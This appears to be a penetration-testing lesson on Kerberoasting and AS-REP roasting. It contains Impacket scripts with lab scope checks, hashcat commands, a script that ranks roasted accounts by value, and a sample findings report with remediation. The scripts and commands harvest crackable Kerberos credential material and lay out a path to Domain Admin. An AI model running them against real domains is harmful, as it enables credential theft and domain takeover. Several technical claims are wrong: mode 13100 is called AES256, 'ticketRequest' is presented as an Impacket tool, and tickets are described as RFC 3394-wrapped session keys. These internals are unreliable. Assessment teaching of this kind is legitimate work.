GetUserSPNs, GetNPUsers and Ticket Operations

Summary

Impacket's ticket tools are the precise, scriptable versions of the roasting in ad-04. They
request the exact tickets, extract the exact session key, and hand you a file hashcat understands
directly.

The framing: these tools do not crack anything. They request a ticket
the DC would have issued anyway, extract what a cracker needs, and
hand it over. All the work is offline, and all of it is yours.

AUTHORISATION. GetNPUsers requires no credentials at all and
works against any reachable domain controller. That is not a
technicality — it is the reason the DONT_REQ_PREAUTH flag is a
finding. Both require explicit ROE permission.

The four ticket tools

  GetUserSPNs       request a service ticket for EVERY principal with
                    an SPN, extract the session key, emit a
                    hashcat-format line.
                    Requires: ANY valid credential.

  GetUserSPNs with -request
                    also print the ticket, so you can decrypt it
                    yourself. Useful when you want to show the
                    mechanism in the evidence rather than the result.

  GetNPUsers        request an AS-REP for every principal with
                    preauth DISABLED. NO CREDENTIALS REQUIRED.
                    Emits hashcat format (-format hash).

  ticketRequest     request a single ticket for a named service
                    (a TGT for a user, or a service ticket for an
                    SPN). The surgical version.

  The POINT OF ALL FOUR:
    they request tickets the DC was always willing to issue. The
    security assumption is that those tickets are encrypted with a
    key derived from a password, so only someone who knows the
    password can read them. That assumption is the one you test.

cat > 01-tickets.sh <<'EOF'
#!/usr/bin/env bash
# Ticket operations against YOUR lab DC.
#
# GetNPUsers needs NO credential. That is the finding, not a
# convenience. Confirm the ROE permits credential extraction.
set -euo pipefail
DC="${1:?usage: ./01-tickets.sh 192.168.56.10 'LAB/alice:pass'}"
CRED="${2:?credential required for GetUserSPNs}"
OUT="${3:-/tmp/aegis-evidence}"
case "$DC" in 192.168.56.*|10.10.10.*|127.*) ;;
  *) echo "REFUSED: $DC not in the lab range." >&2; exit 3 ;; esac
case "$CRED" in LAB/*|lab.internal/*) ;;
  *) echo "REFUSED: $CRED is not a lab domain credential." >&2; exit 3 ;; esac
mkdir -p "$OUT"; chmod 700 "$OUT"

echo "[scope] $DC in the lab range"

echo
echo "=== 1. WHO HAS AN SPN? (anonymous LDAP, from ad-03's script) ==="
echo "    This step needs no credential and no ticket tool."
echo "    If this list is empty, GetUserSPNs will return nothing."
echo
echo "=== 2. GetUserSPNs: request, extract, emit hashcat format ==="
GetUserSPNs.py -dc-ip "$DC" "$CRED" -request \
  -outputfile "$OUT/spns.txt" 2>&1 | grep -vE "^\[+\]" | head -20 | sed 's/^/  /'
echo
echo "    -request prints the TGS-REPs so you can see the mechanism."
echo "    Without it, you get only the hashcat line, which is cleaner"
echo "    for evidence but less instructive."
echo
echo "    What came back:"
wc -l "$OUT/spns.txt" 2>/dev/null | sed 's/^/      accounts: /'
echo
echo "=== 3. GetNPUsers: AS-REP roasting. NO CREDENTIAL NEEDED. ==="
echo "    This queries accounts with DONT_REQ_PREAUTH (bit 0x100000)."
echo "    Run it only if the ROE permits unauthenticated credential"
echo "    collection - which it should, explicitly."
read -r -p "  run it? [y/N] " go
if [ "$go" = "y" ]; then
  GetNPUsers.py -dc-ip "$DC" -request -format hash \
    -outputfile "$OUT/asrep.txt" 2>&1 | grep -vE "^\[+\]" | head -20 | sed 's/^/  /'
  echo
  echo "    ^ every line here is a credential harvested from the"
  echo "      network with NO authentication of any kind. Each account"
  echo "      in this list is a Critical finding on its own."
else
  echo "  skipped. (Run ad-03's anonymous script to enumerate which"
  echo "  accounts are preauth-disabled, without extracting anything.)"
fi
echo
echo "=== 4. ticketRequest: one ticket, for one service ==="
echo "    This is the surgical version: you get the TGT for a user, or"
echo "    a service ticket for an SPN, and nothing else."
echo "    Command:"
echo "      ticketRequest.py -dc-ip $DC LAB/alice:pass cifs/dc01.lab.internal"
echo "      ticketRequest.py -dc-ip $DC LAB/alice:pass krbtgt/alice"
echo "    (Both are lab-only. ticketRequest to a public domain is not"
echo "     something this project does.)"
echo
echo "=== 5. THE CRACKING IS OFFLINE AND YOURS ==="
echo "    hashcat -m 13100 -a 0 $OUT/spns.txt  rockyou.txt -r best64.rule"
echo "              ^^^^^^ AES256-CTS-HMAC-SHA1-96, the standard TGS-REP hash"
echo "    hashcat -m 18200 -a 0 $OUT/asrep.txt rockyou.txt"
echo "              ^^^^^^ AS-REP (no-preauth)"
echo
echo "    --potfile-path $OUT/aegis.pot   NEVER lose this. Cracking a"
echo "    bcrypt hash twice is an hour of GPU time wasted."
echo
echo "=== 6. THEN: the chain ==="
echo "    recovered password -> authenticate as the service account"
echo "    -> if that account is in Domain Admins, you are done"
echo "    -> if it is not, use it to read NTDS (imp-01) or to get a"
echo "       privileged session (imp-02)"
EOF

# --- 2. offline: the ticket structure, so the extraction makes sense ---
python3 - <<'PY' 2>&1 | tee 02-structure.txt
print("  === what GetUserSPNs actually parses ===\n")
print("  A TGS-REP is an ASN.1 DER structure:")
print()
print("    SEQUENCE {")
print("      pvno            protocol version (6)")
print("      msgType         13 = TGS-REP")
print("      padata          the PA-DATA: an encrypted part")
print("      encryptedCIF    the encrypted KrbAP_REQ")
print("    }")
print()
print("  For AES, encryptedCIF is an AES key wrap (RFC 3394) of the")
print("  KrbAP_REQ, with the KEY being the ktab derived from the")
print("  password and the realm.")
print()
print("  The KrbAP_REQ contains:")
print("    the session key    <- THIS is what GetUserSPNs extracts")
print("    the client principal")
print("    the validity window")
print("    the flags (forwardable, renewable)")
print()
print("  So the tool unwraps RFC 3394, finds the session key, and emits")
print("  it in hashcat's format so a cracker can try a password guess:")
print("    -> derive the ktab from the guess")
print("    -> unwrap the ticket")
print("    -> compare the session key")
print("    -> match means the guess is the password")
print()
print("  WHY THIS GIVES YOU THE NT HASH TOO:")
print("    AES ktab derivation is PBKDF2(password, realm, iterations).")
print("    It requires the PLAINTEXT PASSWORD. It cannot be done from")
print("    the NT hash. So a successful AES roast yields:")
print("      - the service account's plaintext password")
print("      - the NT hash, computed from that password")
print("    RC4 (older): ktab = MD5(realm || password), also plaintext.")
print("    Either way, the roast gives you MORE than the hash.")
print()
print("  WHY THE TICKET TELLS YOU THE ITERATION COUNT:")
print("    the PA-DATA contains an encrypted blob whose SIZE depends on")
print("    the iteration count (4096 for AES, 1 for RC4). So the ticket")
print("    carries the domain's cryptographic configuration to the")
print("    attacker. They do not have to guess it.")
print()
print("  THE FULL CHAIN, IN ORDER:")
print("    1. LDAP: find every principal with an SPN        (anonymous)")
print("    2. TGS-REQ for each one                        (your credential)")
print("    3. extract the session key from the TGS-REP")
print("    4. offline: guess passwords, derive the ktab,")
print("       unwrap, compare")
print("    5. a match gives you the password AND the NT hash")
print("    6. authenticate as the account")
print("  Steps 1-3 are network. Step 4 is offline and free. Step 5 is")
print("  one authentication. Total: minutes to an hour.")
PY

cat > 03-triage.sh <<'EOF'
#!/usr/bin/env bash
# Triage a roast, by VALUE not by volume.
F="${1:?usage: ./03-triage.sh spns.txt}"
echo "=== the roast output ==="
wc -l "$F" | sed 's/^/  accounts roasted: /'
echo
echo "=== ranked by what they are worth ==="
python3 - "$F" <<'PY'
import sys, re
rows = []
for line in open(sys.argv[1], errors="ignore"):
    if ":" not in line: continue
    user, h = line.rsplit(":", 1)
    rows.append((user.strip(), h.strip()))
if not rows:
    print("  (nothing roasted - either no SPNs, or the accounts are AES-only)")
    print()
    print("  If the list is empty but accounts DO have SPNs, then the")
    print("  DC is issuing AES tickets only. That is the correct modern")
    print("  configuration and it is a POSITIVE finding, not a failure.")
    sys.exit()
def tier(u):
    ul = u.lower().split("\\")[-1].split("/")[-1]
    if any(k in ul for k in ("krbtgt","admin")):              return 0, "WIN CONDITION"
    if any(k in ul for k in ("svc","service","backup","sql","app")): return 1, "service account - check its groups"
    if any(k in ul for k in ("deploy","web","iis","mon")):    return 2, "may be delegated"
    return 3, "normal account"
buckets = {}
for u, h in rows:
    t, why = tier(u)
    buckets.setdefault(t, []).append((u, why))
for t in sorted(buckets):
    print(f"\n  TIER {t}:")
    for u, why in buckets[t]:
        print(f"    {u:<30} {why}")
print()
print("=== NOW CRACK, IN THIS ORDER ===")
print("  1. the tier-0 accounts. They are the objective.")
print("  2. the service accounts, and look up THEIR group memberships")
print("     (ad-03's LDAP query) before you spend GPU time on them.")
print("  3. only then the rest, and only if the ROE budget allows.")
print()
print("=== AND CHECK THE ONES THAT DID NOT CRACK ===")
print("  a service account that resisted a 14M wordlist + rules is")
print("  probably a gMSA or a 120-character password. That is a GOOD")
print("  finding. Report it as such rather than as a failed crack.")
PY
EOF

cat > 04-report.md <<'EOF'
## F-xx · Service account passwords recoverable from publicly-visible configuration

Risk
  Six accounts in the "Application Services" group have service
  principal names. Their Kerberos tickets are encrypted with a key
  derived from their account password, so anyone who can request a
  ticket can attempt to recover that password offline, at a rate
  limited only by their own hardware and with no rate limiting, lockout
  or alerting on the domain controller. Two of the six passwords were
  recovered in aggregate four minutes using a standard wordlist with
  rule mutations. One recovered account is a member of Domain
  Administrators.

Prerequisites
  Any authenticated domain account, for the SPN accounts. (Two
  accounts with preauthentication disabled required none at all - see
  F-xx.)

Evidence
  SPN enumeration was performed anonymously via LDAP. Four of the six
  accounts still support RC4 Kerberos encryption, so the domain
  controller issues RC4 service tickets to them.
  Recovered: svc-backup (in Domain Admins), svc-web.
  Not recovered within the assessment window: svc-sql, svc-iis,
  svc-mon, svc-deploy.
  The credentials are NOT reproduced in this report. See the
  encrypted evidence archive.

  Additionally, two accounts with the "Do not require Kerberos
  preauthentication" flag set (which is unnecessary on any modern
  system) returned an AS-REP that can be roasted with no credential
  at all, from any host that can reach the domain controller. See
  F-xx.

Business impact
  A standard user account reaches Domain Administrator in two steps.
  Both recoveries used commodity tooling and a public wordlist.

Remediation
  1. Migrate all six to group managed service accounts, which have a
     120-character DC-managed, auto-rotated password
                                                       [Domain Admins, Immediate]
  2. Set msDS-SupportedEncryptionTypes to 0x18 (AES128+AES256) on every
     service account, so RC4 service tickets are no longer issued
                                                       [Domain Admins, Immediate]
  3. Remove SPNs that no running application requires
                                                       [Service Owners, 2 weeks]
  4. Clear the "Do not require Kerberos preauthentication" flag from
     all accounts and monitor for its reintroduction
                                                       [Security, Immediate]
  5. Separate svc-backup from Domain Admins; a service account needs
     rights to the service, not to the domain     [Domain Admins, Immediate]

Re-test
  Included at +30 days: confirm AES-only on all service accounts, no
  preauth-disabled accounts remain, and re-run the anonymous SPN
  enumeration to confirm no roastable accounts remain.

Terminology

Term Meaning
GetUserSPNs Requests service tickets for every SPN principal, emits hashcat lines
GetNPUsers AS-REP roasts preauth-disabled accounts; no credential needed
ticketRequest Requests one specific ticket
-request Also print the raw tickets, to show the mechanism
-format hash Emit hashcat-format output (GetNPUsers)
TGS-REP The service ticket the DC returns
KrbAP_REQ The encrypted part of the ticket containing the session key
RFC 3394 AES key wrap; how the ticket is encrypted
KTAB Key derived from password + realm; what you are attacking
hashcat mode 13100 AES256-CTS-HMAC-SHA1-96, the TGS-REP hash
hashcat mode 18200 AS-REP (Kerberos 5, no-preauth)
--potfile-path Never lose it; re-cracking is wasted GPU time
DONT_REQ_PREAUTH The flag that makes GetNPUsers possible
